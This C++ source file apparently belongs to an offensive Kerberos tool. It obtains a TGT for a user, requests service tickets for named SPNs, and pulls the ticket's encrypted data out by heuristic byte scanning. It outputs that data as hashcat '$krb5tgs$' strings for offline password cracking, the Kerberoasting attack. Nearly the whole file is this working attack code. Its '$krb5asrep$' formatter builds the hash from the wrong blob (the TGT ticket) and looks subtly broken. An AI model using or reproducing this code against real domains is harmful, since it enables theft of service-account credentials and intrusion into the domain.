#include <iostream>
#include <stdexcept>
#include <cstring>
#include <memory>
#include <krb5.h>
#include "KerberosInteraction.h"
#include <sstream>
#include <iomanip>
#include <string>
#include <algorithm>
#include <optional>
#include <vector>


KerberosInteraction::KerberosInteraction() {
    krb5_context ctx = nullptr;
    krb5_error_code err = krb5_init_context(&ctx);
    if (err || !ctx)
        throw std::runtime_error("Failed to initialize Kerberos context");
    context_.reset(ctx);
}

bool KerberosInteraction::requestTGT(const std::string& username, const std::string& password) {
    auto creds = requestTGTCreds(username, password);
    if (!creds) {
        return false;
    }
    
    return cacheTicket(*creds, username);
}

std::optional<krb5_creds> KerberosInteraction::requestTGTCreds(
    const std::string& username, 
    const std::string& password
    ) {
    
    if (!context_) {
        std::cerr << "[-] No krb5 context initialized\n";
        return std::nullopt;
    }

    krb5_principal principal = nullptr;
    krb5_error_code err = krb5_parse_name(context_.get(), username.c_str(), &principal);
    if (err) {
        std::cerr << "[-] Failed to parse name: "
                  << krb5_get_error_message(context_.get(), err) << std::endl;
        return std::nullopt;
    }

    std::unique_ptr<std::remove_pointer_t<krb5_principal>, Krb5PrincipalDeleter> principal_ptr{
        principal, Krb5PrincipalDeleter{context_.get()}
    };

    krb5_creds creds;
    std::memset(&creds, 0, sizeof(krb5_creds));

    err = krb5_get_init_creds_password(
        context_.get(),
        &creds, 
        principal_ptr.get(),
        const_cast<char*>(password.empty() ? nullptr : password.c_str()),
        nullptr,
        nullptr,
        0,
        nullptr,
        nullptr
    );
    
    if (err) {
        std::cerr << "[-] Failed to request TGT: "
                  << krb5_get_error_message(context_.get(), err) << std::endl;
        return std::nullopt;
    }

    std::cout << "[+] Successfully obtained TGT for " << username << std::endl;
    
    return creds;
}

bool KerberosInteraction::cacheTicket(const krb5_creds& creds, const std::string& username) {
    if (!context_) {
        std::cerr << "[-] No krb5 context initialized\n";
        return false;
    }

    krb5_principal principal = nullptr;
    krb5_error_code err = krb5_parse_name(context_.get(), username.c_str(), &principal);
    if (err) {
        std::cerr << "[-] Failed to parse name for cache: "
                  << krb5_get_error_message(context_.get(), err) << std::endl;
        return false;
    }

    std::unique_ptr<std::remove_pointer_t<krb5_principal>, Krb5PrincipalDeleter> principal_ptr{
        principal, Krb5PrincipalDeleter{context_.get()}
    };

    krb5_ccache ccache = nullptr;
    err = krb5_cc_default(context_.get(), &ccache);
    if (err) {
        std::cerr << "[-] Failed to get default ccache: " 
                  << krb5_get_error_message(context_.get(), err) << std::endl;
        return false;
    }

    std::unique_ptr<_krb5_ccache, Krb5CloseCcache> cache{ccache, Krb5CloseCcache{context_.get()}};

    err = krb5_cc_initialize(context_.get(), cache.get(), principal_ptr.get());
    if (err) {
        std::cerr << "[-] Failed to initialize ccache: " 
                  << krb5_get_error_message(context_.get(), err) << std::endl;
        return false;
    }
    
    err = krb5_cc_store_cred(context_.get(), cache.get(), const_cast<krb5_creds*>(&creds));
    if (err) {
        std::cerr << "[-] Failed to store credentials: " 
                  << krb5_get_error_message(context_.get(), err) << std::endl;
        return false;
    }

    std::cout << "[+] Successfully cached TGT for " << username << std::endl;
    return true;
}


std::string KerberosInteraction::requestTGS(const std::string& spn, const std::string& user_requesting) {
    krb5_principal user_requesting_principal;
    krb5_principal spn_principal;
    
    
    krb5_error_code err = krb5_parse_name(context_.get(), const_cast<char*>(user_requesting.c_str()), &user_requesting_principal);
    if (err) {
        std::cerr << "Failed parsing spn name " << krb5_get_error_message(context_.get(), err);
        return "";
    }
    std::unique_ptr<krb5_principal_data, Krb5PrincipalDeleter> user_req_principal_ptr{
        user_requesting_principal, Krb5PrincipalDeleter{context_.get()}
    };
    user_requesting_principal = nullptr;

    err = krb5_parse_name(context_.get(), const_cast<char*>(spn.c_str()), &spn_principal);    
    if (err) {
        std::cerr << "Failed parsing spn name " << krb5_get_error_message(context_.get(), err);
        return "";
    }
    std::unique_ptr<krb5_principal_data, Krb5PrincipalDeleter> service_principal_ptr{
        spn_principal, Krb5PrincipalDeleter{context_.get()}
    };
    spn_principal = nullptr;


    krb5_creds* raw_creds = new krb5_creds();
    std::memset(raw_creds, 0, sizeof(krb5_creds));
    std::unique_ptr<krb5_creds, Krb5CredsDeleter> cred{ raw_creds, Krb5CredsDeleter{ context_.get() } };
    cred.get()->client = user_req_principal_ptr.release();
    cred.get()->server = service_principal_ptr.release();



    krb5_ccache ccache_ = nullptr;
    err = krb5_cc_default(context_.get(), &ccache_);
    if (err) {
        std::cerr << "[-] Failed to get default ccache: " << krb5_get_error_message(context_.get(), err) << std::endl;
        return "";
    }
    
    std::unique_ptr<_krb5_ccache, Krb5CloseCcache> ccache_ptr(
        ccache_, Krb5CloseCcache{context_.get()}
    );
    ccache_ = nullptr;

    krb5_creds* out = nullptr;

    err = krb5_get_credentials(
        context_.get(), 
        0, 
        ccache_ptr.get(), 
        cred.get(), 
        &out
    );

    std::unique_ptr<krb5_creds, Krb5CredsDeleter> retrieved_creds_ptr(
        out, Krb5CredsDeleter{context_.get()}
    );
    out = nullptr;

    if (err) {
        std::cerr << "Failed to request TGS for " << spn << " " << krb5_get_error_message(context_.get(), err);
        return "";
    }

    std::cout << "[*] Requested TGS for " << spn << std::endl;
    
    if (retrieved_creds_ptr && retrieved_creds_ptr->ticket.length > 0) {
        std::string hashcat_ticket = KerberosTicketFormatter::formatTicket_TGS(context_.get(), *retrieved_creds_ptr.get());
        return hashcat_ticket;
    } else {
        std::cerr << "  [Warning] Retrieved credentials structure is empty or has no ticket data." << std::endl;
    }
    return "";
}


std::string KerberosTicketFormatter::formatTicket_TGS(krb5_context ctx, const krb5_creds& creds) {
    std::string client_full = principal_to_string(ctx, creds.client);
    std::string server_full = principal_to_string(ctx, creds.server);

    if (client_full.empty() || server_full.empty()) {
        std::cerr << "[ASN1Parser] Error: Could not unparse client or server name." << std::endl;
        return "";
    }

    std::string server_name, server_realm;
    split_principal(server_full, server_name, server_realm);

    std::string realm_lower = server_realm;
    std::transform(realm_lower.begin(), realm_lower.end(), realm_lower.begin(), ::tolower);
    std::string spn_field = realm_lower + "/" + server_name;

    // Work directly with the raw ticket data
    const unsigned char* ticket_data = (const unsigned char*)creds.ticket.data;
    size_t ticket_len = creds.ticket.length;
    
    // First, find the cipher OCTET STRING
    const unsigned char* cipher_start = nullptr;
    size_t cipher_len = 0;
    size_t cipher_offset = 0;
    
    for (size_t i = 0; i < ticket_len - 4; i++) {
        if (ticket_data[i] == 0x04 && (ticket_data[i+1] == 0x82)) {
            // Found OCTET STRING with 2-byte length
            size_t len = (ticket_data[i+2] << 8) | ticket_data[i+3];
            
            // The cipher should be the largest OCTET STRING in the ticket
            if (len > 1000) {
                cipher_start = ticket_data + i + 4;
                cipher_len = len;
                cipher_offset = i;
                break;
            }
        }
    }

    if (!cipher_start || cipher_len == 0) {
        std::cerr << "[ASN1Parser] Error: Could not find cipher OCTET STRING in ticket" << std::endl;
        return "";
    }

    // Search for the etype that's immediately before the cipher OCTET STRING
    // The pattern is: a3 XX 30 XX a0 XX 02 0x 17 (for etype) ... a2 XX 04 82 XX XX (cipher)
    //                 [3] SEQUENCE [0] INTEGER (etype)          [2] OCTET STRING
    // We need to find the LAST INTEGER before the cipher offset
    krb5_enctype etype = 0;
    bool found_etype = false;
    
    // The EncryptedData structure starts with context tag [3] (0xa3)
    // Look for a3 XX 30 pattern before the cipher
    size_t search_start = (cipher_offset > 100) ? cipher_offset - 100 : 0;
    
    for (size_t i = cipher_offset - 1; i > search_start; i--) {
        // Search backwards for INTEGER tag followed by reasonable etype values
        if (ticket_data[i] == 0x02 && i + 2 < cipher_offset) {
            size_t int_len = ticket_data[i + 1];
            if (int_len == 1 && i + 2 < cipher_offset) {
                krb5_enctype potential_etype = ticket_data[i + 2];
                // Check if this looks like a valid etype (17, 18, or 23)
                if (potential_etype == 17 || potential_etype == 18 || potential_etype == 23) {
                    etype = potential_etype;
                    found_etype = true;
                    break;
                }
            } else if (int_len == 2 && i + 3 < cipher_offset) {
                krb5_enctype potential_etype = (ticket_data[i + 2] << 8) | ticket_data[i + 3];
                if (potential_etype == 17 || potential_etype == 18 || potential_etype == 23) {
                    etype = potential_etype;
                    found_etype = true;
                    break;
                }
            }
        }
    }

    if (!found_etype) {
        std::cerr << "[ASN1Parser] Error: Could not find valid encryption type in ticket" << std::endl;
        std::cerr << "[ASN1Parser] Looked for etypes 17 (AES128), 18 (AES256), or 23 (RC4-HMAC)" << std::endl;
        return "";
    }

    // Determine checksum size based on encryption type
    size_t checksum_size;
    const char* etype_name;
    
    switch (etype) {
        case 17:  // AES128-CTS-HMAC-SHA1-96
            checksum_size = 12;
            etype_name = "AES128-CTS-HMAC-SHA1-96";
            break;
        case 18:  // AES256-CTS-HMAC-SHA1-96
            checksum_size = 12;
            etype_name = "AES256-CTS-HMAC-SHA1-96";
            break;
        case 23:  // RC4-HMAC (ARCFOUR-HMAC-MD5)
            checksum_size = 16;
            etype_name = "RC4-HMAC";
            break;
        default:
            std::cerr << "[ASN1Parser] Error: Unsupported encryption type: " << etype << std::endl;
            return "";
    }

    if (cipher_len < checksum_size) {
        std::cerr << "[ASN1Parser] Error: Cipher too small for checksum. "
                  << "Got " << cipher_len << " bytes, need at least " << checksum_size << std::endl;
        return "";
    }

    // Extract checksum and encrypted data
    std::string checksum_hex = to_hex(cipher_start, checksum_size);
    std::string enc_data_hex = to_hex(cipher_start + checksum_size, cipher_len - checksum_size);

    // Build the hashcat format
    std::stringstream ss_hash;
    ss_hash << "$krb5tgs$" << etype << "$*"
        << server_name << "$" << server_realm << "$"
        << spn_field << "*$"
        << checksum_hex << "$" << enc_data_hex;

    return ss_hash.str();
}

std::string KerberosTicketFormatter::principal_to_string(krb5_context context, krb5_principal principal) {
    char* name_buf = nullptr;
    krb5_error_code ret = krb5_unparse_name(context, principal, &name_buf);

    if (ret) {
        // You could add krb5_get_error_message(context, ret) for more detail
        return "";
    }

    std::string name_str(name_buf);
    krb5_free_unparsed_name(context, name_buf); 
    return name_str;
}

std::string KerberosTicketFormatter::formatTicket_TGT(
    krb5_context ctx, 
    const krb5_creds& creds) {
    
    std::string username_full = principal_to_string(ctx, creds.client);
    if (username_full.empty()) {
        std::cerr << "[ASN1Parser] Error: Could not unparse client name." << std::endl;
        return "";
    }

    std::string username, realm;
    split_principal(username_full, username, realm);

    // Para AS-REP (TGT), o ticket está em creds.ticket
    const unsigned char* ticket_data = (const unsigned char*)creds.ticket.data;
    size_t ticket_len = creds.ticket.length;

    // Encontrar o cipher OCTET STRING
    const unsigned char* cipher_start = nullptr;
    size_t cipher_len = 0;
    size_t cipher_offset = 0;
    
    for (size_t i = 0; i < ticket_len - 4; i++) {
        if (ticket_data[i] == 0x04 && (ticket_data[i+1] == 0x82)) {
            size_t len = (ticket_data[i+2] << 8) | ticket_data[i+3];
            
            if (len > 1000) {
                cipher_start = ticket_data + i + 4;
                cipher_len = len;
                cipher_offset = i;
                break;
            }
        }
    }

    if (!cipher_start || cipher_len == 0) {
        std::cerr << "[ASN1Parser] Error: Could not find cipher in TGT" << std::endl;
        return "";
    }

    // Encontrar o etype
    krb5_enctype etype = 0;
    bool found_etype = false;
    
    size_t search_start = (cipher_offset > 100) ? cipher_offset - 100 : 0;
    
    for (size_t i = cipher_offset - 1; i > search_start; i--) {
        if (ticket_data[i] == 0x02 && i + 2 < cipher_offset) {
            size_t int_len = ticket_data[i + 1];
            if (int_len == 1) {
                krb5_enctype potential_etype = ticket_data[i + 2];
                if (potential_etype == 17 || potential_etype == 18 || potential_etype == 23) {
                    etype = potential_etype;
                    found_etype = true;
                    break;
                }
            }
        }
    }

    if (!found_etype) {
        std::cerr << "[ASN1Parser] Error: Could not find valid etype in TGT" << std::endl;
        return "";
    }

    // Determinar tamanho do checksum
    size_t checksum_size = (etype == 23) ? 16 : 12;

    if (cipher_len < checksum_size) {
        std::cerr << "[ASN1Parser] Error: Cipher too small" << std::endl;
        return "";
    }

    // Extrair checksum e dados encriptados
    std::string checksum_hex = to_hex(cipher_start, checksum_size);
    std::string enc_data_hex = to_hex(cipher_start + checksum_size, cipher_len - checksum_size);

    // Formato AS-REP do hashcat: $krb5asrep$<etype>$<username>@<realm>:<checksum>$<encrypted_data>
    std::stringstream ss_hash;
    ss_hash << "$krb5asrep$" << etype << "$"
            << username << "@" << realm << ":"
            << checksum_hex << "$" << enc_data_hex;

    return ss_hash.str();
}

void KerberosTicketFormatter::split_principal(const std::string& full_principal, std::string& name, std::string& realm) {
    size_t at_pos = full_principal.find('@');
    if (at_pos == std::string::npos) {
        name = full_principal;
        realm = "";
    } else {
        name = full_principal.substr(0, at_pos);
        realm = full_principal.substr(at_pos + 1);
    }
}

std::string KerberosTicketFormatter::to_hex(const unsigned char* data, size_t len) {
    std::stringstream ss;
    ss << std::hex << std::setfill('0');
    for (size_t i = 0; i < len; ++i) {
        ss << std::setw(2) << static_cast<unsigned>(data[i]);
    }
    return ss.str();
}